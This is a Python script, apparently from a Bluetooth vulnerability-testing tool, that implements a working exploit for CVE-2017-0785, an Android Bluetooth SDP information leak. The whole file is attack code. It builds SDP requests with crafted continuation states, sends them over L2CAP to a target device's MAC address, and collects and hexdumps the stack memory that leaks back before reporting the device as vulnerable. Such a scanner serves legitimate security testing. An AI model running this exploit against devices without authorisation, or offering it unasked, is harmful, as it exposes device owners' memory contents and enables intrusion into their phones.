from pwn import *
import bluetooth
import logging
import select
import argparse
from sbleedyCLI.report import report_vulnerable, report_not_vulnerable, report_error
from sbleedyCLI.constants import LOG_FILE

service_long = 0x0100
service_short = 0x0001
mtu = 50
n = 30

def packet(service, continuation_state):
    pkt = b'\x02\x00\x00'
    pkt += p16(7 + len(continuation_state))
    pkt += b'\x35\x03\x19'
    pkt += p16(service)
    pkt += b'\x01\x00'
    pkt += continuation_state
    return pkt

def run_exploit(target: str):
    print('CVE-2017-0785: Creating L2CAP socket')

    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, mtu)
    context.endian = 'big'

    print('CVE-2017-0785: Connecting to target')
    sock.connect((target, 1))

    print('CVE-2017-0785: Sending packet 0')
    sock.send(packet(service_long, b'\x00'))
    sock.setblocking(0)
    ready = select.select([sock], [], [], 10)
    if ready[0]:
        data = sock.recv(mtu)

    if data[-3] != ord(b'\x02'):
        logging.error('CVE-2017-0785: Invalid continuation state received.')

    stack = b''

    for i in range(1, n):
        print('CVE-2017-0785: Sending packet %d' % i)
        sock.send(packet(service_short, data[-3:]))
        sock.setblocking(0)
        ready = select.select([sock], [], [], 10)
        if ready[0]:
            data = sock.recv(mtu)
            stack += data[9:-3]

    sock.close()

    print('CVE-2017-0785: Done')

    print('CVE-2017-0785: ' + hexdump(stack))
    if len(stack) > 0:
        report_vulnerable(hexdump(stack))
    else:
        report_not_vulnerable(hexdump(stack))

if __name__ == '__main__':
    logging.basicConfig(filename=LOG_FILE, level=logging.INFO)
    parser = argparse.ArgumentParser(description="CVE-2017-0785 Args")
    parser.add_argument('--target', type=str, help='Target MAC address')
    args = parser.parse_args()
    if not args.target:
        logging.error("Wrong Usage Error: CVE-2017-0785.py --target XX:XX:XX:XX:XX:XX")
        report_error("Wrong usage of CVE-2017-0785.py")
        exit()

    print("[i] CVE-2017-0785: Please make sure your Android device is discoverable")
    try:
        run_exploit(args.target)
    except Exception as e:
        if str(e) == "Invalid continuation state received.":
            report_not_vulnerable("Target device OS is not Android")
        else:
            report_error(str(e))